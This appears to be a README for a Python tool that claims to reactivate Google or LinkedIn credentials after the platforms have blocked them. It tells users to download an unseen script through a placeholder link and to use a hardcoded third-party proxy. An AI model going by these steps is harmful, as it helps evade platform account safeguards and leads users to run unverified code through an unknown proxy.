# activator

Please follow the instructions carefully.

## Preparation
### Download Script
In order to reactivate a credential blocked by Google or LinkedIn, you need to download a python script. When you are ready to go, [Download](https://google.com) now and extract a specific path and cd.
```shell
you@machine:script/path$
```
### Virtual Env Configuration
In order to execute the script, please prepare a specific virtuen env. Suppose that you've created a virtual env named **activator**. Then you will see the following prefix in your shell.
```shell
(activator)you@machine:script/path$
```
### Dependency Installation
Now, you are ready to install python packages.
```shell
(activator)you@machine:script/path$ pip install -r requirements.txt
```

## Reactivating Credential
Before getting started, don't forget to copy the following proxy into clipboard.
```
181.41.200.64:21295
```
Now you are ready to start the reactivating process and just execute the following command.
```shell
(activator)you@machine:script/path$ python run.py
```